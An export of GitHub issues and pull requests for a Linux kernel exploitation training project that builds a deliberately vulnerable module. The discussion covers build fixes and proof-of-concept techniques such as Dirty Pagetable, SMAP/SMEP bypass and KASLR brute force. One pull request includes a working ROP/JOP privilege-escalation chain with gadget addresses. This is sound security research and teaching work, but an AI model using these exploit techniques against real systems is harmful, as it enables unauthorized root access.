Export of Github issues for [a13xp0p0v/kernel-hack-drill](https://github.com/a13xp0p0v/kernel-hack-drill).

# [\#14 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/14) `merged`: Fix build error for shm_open on older Debian

#### <img src="https://avatars.githubusercontent.com/u/67371653?u=f5d8536b55c751c2bdb6358897d72523a01006a2&v=4" width="50">[Willenst](https://github.com/Willenst) opened issue at [2025-10-30 13:31](https://github.com/a13xp0p0v/kernel-hack-drill/pull/14):

Hello, I tried building drill_uaf_w_pte on an older Debian and ran into this error:
```
gcc drill_uaf_w_pte.c -Wall -static -o drill_uaf_w_pte
/usr/bin/ld: /tmp/ccjzpcz8.o: in function `prepare_page_tables':
drill_uaf_w_pte.c:(.text+0x273): undefined reference to `shm_open'
collect2: error: ld returned 1 exit status
make: *** [Makefile:14: all] Error 1
```

I suppose the problem happens because on older glibc, `shm_open` lives in librt, and some pthread symbols also need to be linked explicitly.

This patch fixes the issue by changing the build command to use flags:
`-lrt -pthread`

- `-lrt` (needed for `shm_open` on older glibc
- `-pthread` ensures `__shm_directory` symbols are found

This works both on older and newer glibc versions: on newer the symbols are already in libc, so `-lrt` and `-lc` don’t hurt. Now the binary builds successfully without errors.


#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-10-30 15:51](https://github.com/a13xp0p0v/kernel-hack-drill/pull/14#issuecomment-3468712547):

Nice, thank you for the fix!


-------------------------------------------------------------------------------

# [\#13 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/13) `open`: feat(exploit,drill_mod.c): new `drill_uaf_oobw.c`

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) opened issue at [2025-10-24 09:02](https://github.com/a13xp0p0v/kernel-hack-drill/pull/13):

hello, @a13xp0p0v !

i've created new memory corruption type for drill

here is a summary of my PR:
1. tiny modification for `drill_mod.c` allowing OOBW
2. small change to `drill_test.c`
3. a basic out‑of‑bounds write exploit that corrupts `msg_msg->next` causing dangling reference to next `msg_msg`; it uses to reclaim victim `msg_msg` with *fake* `msg_msg` created via `sk_buff.data` enabling out-of-bounds reading of the kernel memory




-------------------------------------------------------------------------------

# [\#12 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/12) `open`: Implementatonn of SMAP bypass + LPE via `core_pattern` overwrite

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) opened issue at [2025-09-10 09:49](https://github.com/a13xp0p0v/kernel-hack-drill/pull/12):

hello, @a13xp0p0v 

please have a look at this PoC

SMAP bypass is implemented via two stack-based pivot in kernel space, allowing execution ROP/JOP stored in `pt_regs`, `drill_item_t`. The payload overwrites `core_pattern`, resulting in a local privilege escalation (LPE).

i also though about `goto end` . and i have to edit this label a bit because of my ROP/JOP chain which forces primary thread to sleep. can we discuss this and other parts of code to refactor? will do my best





-------------------------------------------------------------------------------

# [\#11 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/11) `merged`: fix(clang): mixing declarations and code

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) opened issue at [2025-07-26 17:55](https://github.com/a13xp0p0v/kernel-hack-drill/pull/11):

hello, @a13xp0p0v 

i recently tried to integrate drill into COS kernel

`clang` a bit mad at some variable decalrations:

```
d@c553020e9dfc:/src/drill/kernel-hack-drill$ git status
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
d@c553020e9dfc:/src/drill/kernel-hack-drill$ KPATH=../. make LLVM=1 -j16
gcc drill_test.c -Wall -static -o drill_test
gcc drill_uaf_callback.c -Wall -static -o drill_uaf_callback
gcc drill_uaf_callback_rop_smep.c  -Wall -static -o drill_uaf_callback_rop_smep
gcc drill_uaf_w_msg_msg.c -Wall -static -o drill_uaf_w_msg_msg
gcc drill_uaf_w_pipe_buffer.c -Wall -static -o drill_uaf_w_pipe_buffer
gcc drill_uaf_w_pte.c -Wall -static -o drill_uaf_w_pte
gcc drill_uaf_w_pud.c -Wall -static -o drill_uaf_w_pud
make -C ../. M=/src/drill/kernel-hack-drill modules
make[1]: warning: jobserver unavailable: using -j1.  Add '+' to parent make rule.
make[1]: Entering directory '/src/drill'
  CC [M]  /src/drill/kernel-hack-drill/drill_mod.o
/src/drill/kernel-hack-drill/drill_mod.c:70:3: error: expected expression
                unsigned long val = 0;
                ^
/src/drill/kernel-hack-drill/drill_mod.c:84:32: error: use of undeclared identifier 'val'
                ret = kstrtoul(arg2_str, 0, &val);
                                             ^
/src/drill/kernel-hack-drill/drill_mod.c:97:42: error: use of undeclared identifier 'val'
                                sizeof(struct drill_item_t) - sizeof(val)) {
                                                                     ^
/src/drill/kernel-hack-drill/drill_mod.c:104:6: error: use of undeclared identifier 'val'
                                        val, n, (unsigned long)drill.items[n],
                                        ^
/src/drill/kernel-hack-drill/drill_mod.c:106:16: error: use of undeclared identifier 'val'
                *data_addr = val;  /* No check, BAD BAD BAD */
                             ^
/src/drill/kernel-hack-drill/drill_mod.c:71:17: warning: mixing declarations and code is a C99 extension [-Wdeclaration-after-statement]
                unsigned long offset = 0;
                              ^
1 warning and 5 errors generated.
make[2]: *** [scripts/Makefile.build:280: /src/drill/kernel-hack-drill/drill_mod.o] Error 1
make[1]: *** [Makefile:1822: /src/drill/kernel-hack-drill] Error 2
make[1]: Leaving directory '/src/drill'
make: *** [Makefile:16: all] Error 2
d@c553020e9dfc:/src/drill/kernel-hack-drill$
```

i have beautiful fix for that:

```
d@c553020e9dfc:/src/drill/kernel-hack-drill$ git diff HEAD~1
diff --git a/drill_mod.c b/drill_mod.c
index da17f7b..084b64b 100644
--- a/drill_mod.c
+++ b/drill_mod.c
@@ -27,6 +27,9 @@ static int drill_act_exec(long act,
 {
        int ret = 0;
        unsigned long n = 0;
+       unsigned long val = 0;
+       unsigned long offset = 0;
+       unsigned long *data_addr = NULL;

        if (!arg1_str) {
                pr_err("drill: item number is missing\n");
@@ -67,10 +70,6 @@ static int drill_act_exec(long act,
                break;

        case DRILL_ACT_SAVE_VAL:
-               unsigned long val = 0;
-               unsigned long offset = 0;
-               unsigned long *data_addr = NULL;
-
                if (!arg2_str) {
                        pr_err("drill: save_val: missing value\n");
                        return -EINVAL;
d@c553020e9dfc:/src/drill/kernel-hack-drill$ KPATH=../. make LLVM=1
gcc drill_test.c -Wall -static -o drill_test
gcc drill_uaf_callback.c -Wall -static -o drill_uaf_callback
gcc drill_uaf_callback_rop_smep.c  -Wall -static -o drill_uaf_callback_rop_smep
gcc drill_uaf_w_msg_msg.c -Wall -static -o drill_uaf_w_msg_msg
gcc drill_uaf_w_pipe_buffer.c -Wall -static -o drill_uaf_w_pipe_buffer
gcc drill_uaf_w_pte.c -Wall -static -o drill_uaf_w_pte
gcc drill_uaf_w_pud.c -Wall -static -o drill_uaf_w_pud
make -C ../. M=/src/drill/kernel-hack-drill modules
make[1]: Entering directory '/src/drill'
  CC [M]  /src/drill/kernel-hack-drill/drill_mod.o
  MODPOST /src/drill/kernel-hack-drill/Module.symvers
  CC [M]  /src/drill/kernel-hack-drill/drill_mod.mod.o
  LD [M]  /src/drill/kernel-hack-drill/drill_mod.ko
make[1]: Leaving directory '/src/drill'
d@c553020e9dfc:/src/drill/kernel-hack-drill$
```



#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-07-26 18:22](https://github.com/a13xp0p0v/kernel-hack-drill/pull/11#issuecomment-3122199041):

Excellent, thanks @d1sgr4c3, merged :+1:


-------------------------------------------------------------------------------

# [\#10 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/10) `merged`: Dirty pagetable enhancement

#### <img src="https://avatars.githubusercontent.com/u/67371653?u=f5d8536b55c751c2bdb6358897d72523a01006a2&v=4" width="50">[Willenst](https://github.com/Willenst) opened issue at [2025-06-06 12:44](https://github.com/a13xp0p0v/kernel-hack-drill/pull/10):

Hi,
I did some additional research on the technique and found that mapping to a file can increase post-exploitation stability when `PAGE_TABLE_CHECK` hardening is enabled. I use mapping to a file from `/dev/shm` to  freeze the release of the corrupted memory (when we rewrite paging, we actually corrupt the data refcounts, which is checked on hardened kernels).

Other than that, I was able to improve the stability of PUD bruteforce on machines with large memory counts, refers to point 1 of #9 . I managed to stabilize the exploit on certain addresses (2 and 3 gigabytes, which often belong to the PCI bus and leads to kernel panic when touched without care) by replacing the `memcmp` call with a manual byte comparison approach. Please check on your configuration, it worked for me but I'm not sure if it will always work.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-07-16 22:11](https://github.com/a13xp0p0v/kernel-hack-drill/pull/10#issuecomment-3081361960):

Hello @Willenst, thanks for the pull request, cool!

I've made some style fixes in `drill_uaf_w_pte.c` and moved PTE repairing to the proper place.

Could you please do similar changes for `drill_uaf_w_pud.c` (and minimize the diff between these two files)?

Thanks!

#### <img src="https://avatars.githubusercontent.com/u/67371653?u=f5d8536b55c751c2bdb6358897d72523a01006a2&v=4" width="50">[Willenst](https://github.com/Willenst) commented at [2025-07-17 08:51](https://github.com/a13xp0p0v/kernel-hack-drill/pull/10#issuecomment-3083213916):

Hello @a13xp0p0v ! I made the same fixes for the `drill_uaf_w_pud.c`. The only exception is that I've made a `goto repair;` after the error in pud_write(). This error may be caused by an error in either act() or flush_tlb(). In both cases, filling up the data with zeroes would not cause much harm. I think this is better than reworking the entire `pud_write()` mechanism.

Also, note that in the PUD case, CONFIG_PAGE_TABLE_CHECK needs an additional fix (except for filemap) only if CONFIG_TRANSPARENT_HUGEPAGE is enabled.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-07-18 18:32](https://github.com/a13xp0p0v/kernel-hack-drill/pull/10#issuecomment-3090324320):

Thanks for the contribution, @Willenst!
I've made some minor style improvements and merged this.


-------------------------------------------------------------------------------

# [\#9 Issue](https://github.com/a13xp0p0v/kernel-hack-drill/issues/9) `closed`: Improve searching `modprobe_path` in `drill_uaf_w_pud.c`
**Labels**: `bug`


#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) opened issue at [2025-05-18 10:39](https://github.com/a13xp0p0v/kernel-hack-drill/issues/9):

Currently, I see some bugs in searching `modprobe_path` in `drill_uaf_w_pud.c`.

Let's improve the search heuristics.

### 1. The kernel crashes on Ubuntu with large amount of RAM

Ubuntu Desktop 22.04 on a Lenovo ThinkPad laptop (16 GB of RAM) gets panic and reboots when we scan first gigabytes of physical memory.

Similarly, Ubuntu Server 24.04 on a virtual machine gets a kernel crash:

![Image](https://github.com/user-attachments/assets/2e6d98fb-047f-4998-ae34-12611ecbcef3)

I think we can change the search logic depending of the RAM size.

### 2. Searching `modprobe_path` sometimes gives false positive errors

The example on Ubuntu Server 24.04 in a virtual machine with 1.4 GiB of RAM:

![Image](https://github.com/user-attachments/assets/cd82a5e3-c361-4c9d-a530-68132f6cd3b1)

I think we can improve the `modprobe_path` search heuristics:
 - Maybe check the alignment?
 - Maybe start the recursive search from `kernel_text + KERNEL_TEXT_PATTERN_LEN`?
 - Maybe call `memmem()` for `modprobe_path` several times (in a memory region that has `_text` size and not till the end of huge page)?

Refers to #8.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-07-18 18:35](https://github.com/a13xp0p0v/kernel-hack-drill/issues/9#issuecomment-3090330916):

The first issue is fixed in #10.

The second one can't be reproduced very often, so I'm closing this issue for now.


-------------------------------------------------------------------------------

# [\#8 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/8) `merged`: Add drill_uaf_write_dirty_hugepagetable

#### <img src="https://avatars.githubusercontent.com/u/67371653?u=f5d8536b55c751c2bdb6358897d72523a01006a2&v=4" width="50">[Willenst](https://github.com/Willenst) opened issue at [2025-05-14 16:39](https://github.com/a13xp0p0v/kernel-hack-drill/pull/8):

Hello! I recently contributed a basic variation of Dirty Pagetable: https://github.com/a13xp0p0v/kernel-hack-drill/pull/4.

Now, I present a slightly modified version that uses huge pages to brute force KASLR in a few steps!

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-05-14 20:29](https://github.com/a13xp0p0v/kernel-hack-drill/pull/8#issuecomment-2881484113):

Cool, thanks @Willenst!

Could you please rebase this branch onto the fresh `master`?

I've improved the file naming. So please call this PoC `drill_uaf_w_pud.c`.

Also please don't forget to update the `README` and `Makefile`.

Thanks!

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-05-18 08:50](https://github.com/a13xp0p0v/kernel-hack-drill/pull/8#issuecomment-2888864420):

Hello @Willenst!

I've done a lot of work improving this branch. Please see my commits.

I've merged this branch.

However, I've found out some failures of `modprobe_path` searching on different machines. I'm going to create a separate issue for that.

Thanks!


-------------------------------------------------------------------------------

# [\#7 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/7) `merged`: Cleaning PoC's files

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) opened issue at [2025-04-24 15:12](https://github.com/a13xp0p0v/kernel-hack-drill/pull/7):

hello, @a13xp0p0v !

after using the `drill_uaf_callback.c` and`drill_uaf_write_msg_msg.c` there are some temporary files left:

```
$ make clean
    [...]
$ git status
On branch master
Your branch is up to date with 'origin/master'.

Untracked files:
  (use "git add <file>..." to include in what will be committed)
 foobar
 forftok1

nothing added to commit but untracked files present (use "git add" to track)
$
```

i implemented very simple `remove()` in each file. **there's still the question of design**
can we work on it?

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-05-14 21:12](https://github.com/a13xp0p0v/kernel-hack-drill/pull/7#issuecomment-2881592494):

Good point, thanks @d1sgr4c3!

I would ask you to rebase this branch onto the fresh `master`.

And please add the minor fixes described in my review.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-07-18 18:50](https://github.com/a13xp0p0v/kernel-hack-drill/pull/7#issuecomment-3090374412):

Hello @d1sgr4c3, would you like to finish this pull request?

If so, I would also ask to rebase this branch onto the fresh master.

Thank you!

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-07-19 03:31](https://github.com/a13xp0p0v/kernel-hack-drill/pull/7#issuecomment-3091466176):

@a13xp0p0v, thank you so much for your patience, of course I want to finish
please look at the new edits

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-07-19 13:12](https://github.com/a13xp0p0v/kernel-hack-drill/pull/7#issuecomment-3092345092):

Thanks @d1sgr4c3, I've added a missing piece and merged this.


-------------------------------------------------------------------------------

# [\#6 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6) `merged`: Implementation of LPE and SMEP bypassing using ROP/JOP chain

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) opened issue at [2025-03-23 13:28](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6):

hello, @a13xp0p0v 
I recently implemented a SMEP bypass using a ROP/JOP chain.
The exploit was tested on kernel 6.12.7, so I'm ready to provide it:
- `.config`
- `vmlinux`
- `bzimage`
by your preferred way of communication

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-03-28 02:35](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2760024433):

i also added various info about kernel version i used, compiler and diff with defconfig

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-04-22 15:25](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2821695135):

Hello @d1sgr4c3 , 

Thanks a lot for your work, cool!

How about creating a separate PoC that performs control flow hijack with ROP?

I would call it `drill_uaf_callback_rop_smep.c`.

Please don't forget to update the README by the way.

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-04-24 06:05](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2826481703):

hello, @a13xp0p0v 

> How about creating a separate PoC that performs control flow hijack with ROP?
really  great idea, so we don't break existing functionality.


minimized diff between old callback and mine:

```diff
--- drill_uaf_callback.c	2025-04-28 12:42:18.516016046 +1000
+++ drill_uaf_callback_rop_smep.c	2025-04-28 16:03:49.757000192 +1000
@@ -9,10 +9,24 @@
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
  * 2) Disable mitigations:
- *   - run qemu with "-cpu qemu64,-smep,-smap".
+ *   - run qemu with "-cpu qemu64,+smep,-smap".
  *   - run the kernel with "pti=off nokaslr".
  *
- * This PoC performs control flow hijack and gains LPE.
+ * 3) Check your kernel version:
+ *   - head at v6.12.7 tag,
+ *   319addc2ad901dac4d6cc931d77ef35073e0942f
+ *
+ * 4) Difference from `defconfig`:
+ *   - CONFIG_CONFIGFS_FS=y
+ *   - CONFIG_SECURITYFS=y
+ *   - CONFIG_DEBUG_INFO=y
+ *   - CONFIG_DEBUG_INFO_DWARF4=y
+ *   - CONFIG_DEBUG_INFO_COMPRESSED_NONE=y
+ *   - CONFIG_GDB_SCRIPTS=y
+ *
+ *  5) Compiler is gcc, version 11.4.0
+ *
+ * This PoC performs control flow hijack and gains LPE and SMEP buypass via ROP/JOP.
  */
 
 #define _GNU_SOURCE
@@ -29,28 +43,74 @@
 #include <sys/xattr.h>
 #include "drill.h"
 
+/*  payload mmap() defines  */
 #define MMAP_SZ			0x1000
 #define PAYLOAD_SZ		95
 
+/* fake stack mmap() defines */
+#define FAKE_STACK_ADDR 0xf6000000 /* STACKPIVOT_GADGET_PTR changes rsp to this value */
+#define PAGE_SIZE       0x1000
+#define MMAP_ADDR       (FAKE_STACK_ADDR - PAGE_SIZE)
+#define MMAP_SIZE       (PAGE_SIZE * 2)
+
 /* ============================== Kernel stuff ============================== */
 
 /* Addresses from System.map (no KASLR) */
-#define COMMIT_CREDS_PTR 0xffffffff81123b20lu
-#define PREPARE_KERNEL_CRED_PTR 0xffffffff81124080lu
-#define INIT_TASK_PTR 0xffffffff83411080lu
-
-typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
-typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
+#define COMMIT_CREDS_PTR              0xffffffff810c0960UL
+#define PREPARE_KERNEL_CRED_PTR       0xffffffff810c0bf0UL
+#define INIT_TASK_PTR                 0xffffffff82a0c940UL
+
+/* ROP gadgets */
+#define STACKPIVOT_GADGET_PTR         0xffffffff81c1349bUL /* mov esp, 0xf6000000 ; ret */
+#define POP_RDI                       0xffffffff810862ccUL /* pop rdi ; ret */
+#define POP_RAX                       0xffffffff810604c4UL /* pop rax ; ret */
+#define JMP_RAX                       0xffffffff810372abUL /* jmp rax */
+#define PUSH_RAX_POP_RSI              0xffffffff81d1da58UL /* push rax ; pop rsi ; ret */
+#define PUSH_RSI_POP_RDI_JMP          0xffffffff810f1a26UL /* push rsi ; pop rdi ; add eax, dword ptr [rax] ; jmp 0xffffffff810f19de */
+#define XCHG_RAX_RBP                  0xffffffff81633c34UL /* xchg rax, rbp ; ret */
+#define SUB_RAX_RDI                   0xffffffff81f2ec90UL /* sub rax, rdi ; ret */
+#define PUSH_RAX_POP_RSP_DEC_PTR_RAX  0xffffffff81d186f5UL /* push rax ; pop rsp ; dec DWORD PTR [rax-0x7d] ; ret */
 
-_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
-_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;
+/* ========================================================================== */
 
-void root_it(void)
+void build_stack()
 {
-	commit_creds(prepare_kernel_cred(INIT_TASK_PTR));
-}
+	char *mmaped_area = mmap((void *)MMAP_ADDR, MMAP_SIZE, PROT_WRITE,
+				 MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
+	unsigned long *fake_stack = NULL;
+	unsigned long off = 0;
 
-/* ========================================================================== */
+	if (mmaped_area < 0) {
+		perror("[-] mmap");
+		exit(EXIT_FAILURE);
+	}
+	if (mmaped_area != (void *)MMAP_ADDR) {
+		printf("[-] mmaped to wrong addr: %p\n", mmaped_area);
+		exit(EXIT_FAILURE);
+	}
+	printf("[+] mmaped_area is at %p\n", mmaped_area);
+	memset(mmaped_area, 0, MMAP_SIZE);
+
+	fake_stack = (unsigned long *)(mmaped_area + PAGE_SIZE);
+	printf("[+] fake stack for the ROP chain is at %p\n", fake_stack);
+
+	fake_stack[off++] = POP_RDI;
+	fake_stack[off++] = INIT_TASK_PTR; /* passed as the 1st argument of the prepare_kernel_cred() */
+	fake_stack[off++] = POP_RAX;
+	fake_stack[off++] = PREPARE_KERNEL_CRED_PTR;
+	fake_stack[off++] = JMP_RAX; /* executes prepare_kernel_cred(&init_task) */
+	fake_stack[off++] = PUSH_RAX_POP_RSI;     /* the value returned by prepare_kernel_cred is  */
+	fake_stack[off++] = PUSH_RSI_POP_RDI_JMP; /*  passed to RDI 1st argument of the function   */
+	fake_stack[off++] = 0xdeadfeed; /* previous gadget adds 8 to rsp due to JMP */
+	fake_stack[off++] = POP_RAX;
+	fake_stack[off++] = COMMIT_CREDS_PTR;
+	fake_stack[off++] = JMP_RAX; /* executes commit_creds(prepare_kernel_cred(&init_task)) */
+	fake_stack[off++] = XCHG_RAX_RBP; /* RBP contains a pointer */
+	fake_stack[off++] = POP_RDI;	  /*  that differs by 0x37  */
+	fake_stack[off++] = 0x37;	  /*    from the old RSP    */
+	fake_stack[off++] = SUB_RAX_RDI;
+	fake_stack[off++] = PUSH_RAX_POP_RSP_DEC_PTR_RAX; /* restore the RSP and continue legitimate execution */
+}
 
 int do_cpu_pinning(void)
 {
@@ -104,7 +164,7 @@
 
 	memset(p, 0x41, size);
 
-	item->callback = root_it;
+	item->callback = (void (*)(void))STACKPIVOT_GADGET_PTR;
 
 	printf("[+] payload:\n");
 	printf("\tstart at %p\n", p);
@@ -151,6 +211,9 @@
 	/*
 	 * Prepare
 	 */
+	do_cpu_pinning();
+	build_stack();
+
 	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
 					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (spray_data == MAP_FAILED) {
@@ -197,6 +260,18 @@
 	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
 	printf("setxattr returned %d\n", ret);
 
+	/*
+	 * While debugging a ROP chain, I noticed repeated double_fault errors.
+	 * It turned out that by this time the scheduler slot was running out
+	 * and our process was being preempted by a new process
+	 * where the 'fake_stack' was not mmaped.
+	 *
+	 * This function frees the current CPU for other tasks,
+	 * effectively allowing the ROP chain (which executes after the second callback)
+	 * to execute from the new scheduler slot.
+	 */
+	int sched_yield();
+
 	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
 		goto end;
 	printf("[+] DRILL_ACT_CALLBACK\n");
```

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-05-14 21:32](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2881632085):

Good, thanks @d1sgr4c3!

I would ask you to rebase onto the fresh `master` once again.

And please also see my review.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-05-14 22:17](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2881714240):

Feel free to squash all changes into one commit and do the force push of this branch.

Thanks!

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-06-02 16:52](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2931578241):

thank you, @a13xp0p0v!
i made the changes you requested

please take another look

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-06-21 21:52](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2993787148):

@d1sgr4c3, thanks again for your contribution! Merged.

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-06-23 08:51](https://github.com/a13xp0p0v/kernel-hack-drill/pull/6#issuecomment-2995543018):

much thanks, @a13xp0p0v !


-------------------------------------------------------------------------------

# [\#5 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5) `merged`: Drill guide

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) opened issue at [2025-03-01 10:02](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5):

hello, @a13xp0p0v 
me (@d1sgr4c3) and @Willenst cooperated to implement this guide: here is a manual  which can help newcomers to build their first testing stand and save time to other researchers 
also there is a `Makefile` enhancements which adds new target for build

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-03-01 15:03](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5#issuecomment-2692272646):

Hello @d1sgr4c3 , @Willenst 

Nice idea, thanks for the pull request!

Please see my review.

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-03-01 15:38](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5#issuecomment-2692287546):

And please rebase your branch onto the current master. Thanks!

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-03-02 03:36](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5#issuecomment-2692539045):

i tried to resolve merge conflict and it seems like github accidentally closed my  PR
sorry)

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-03-02 09:20](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5#issuecomment-2692638795):

rebased, made requested changes!

#### <img src="https://avatars.githubusercontent.com/u/1419667?u=de82e29061c3ef5f1c19f95528f8a82b08051fd2&v=4" width="50">[a13xp0p0v](https://github.com/a13xp0p0v) commented at [2025-03-09 11:52](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5#issuecomment-2708818057):

Cool, thanks for your work!

FYI, I added some fixes to `README` outside of this branch because I was not able to push to it.

#### <img src="https://avatars.githubusercontent.com/u/121037831?u=fc711d33e89e67f8ad3094527177769eba26ba18&v=4" width="50">[d1sgr4c3](https://github.com/d1sgr4c3) commented at [2025-03-09 12:06](https://github.com/a13xp0p0v/kernel-hack-drill/pull/5#issuecomment-2708823847):

sure, @a13xp0p0v
forgot to click on the button about "maintainer can edit" or something like this

anyway, thank you for referring this MR in the commit message
much thanks, @Willenst @a13xp0p0v, we did good job together!


-------------------------------------------------------------------------------

# [\#4 PR](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4) `merged`: Dirty pagetable

#### <img src="https://avatars.githubusercontent.com/u/67371653?u=f5d8536b55c751c2bdb6358897d72523a01006a2&v=4" width="50">[Willenst](https://github.com/Willenst) opened issue at [2025-02-18 10:42](https://github.com/a13xp0p0v/kernel-hack-drill/pull/4):

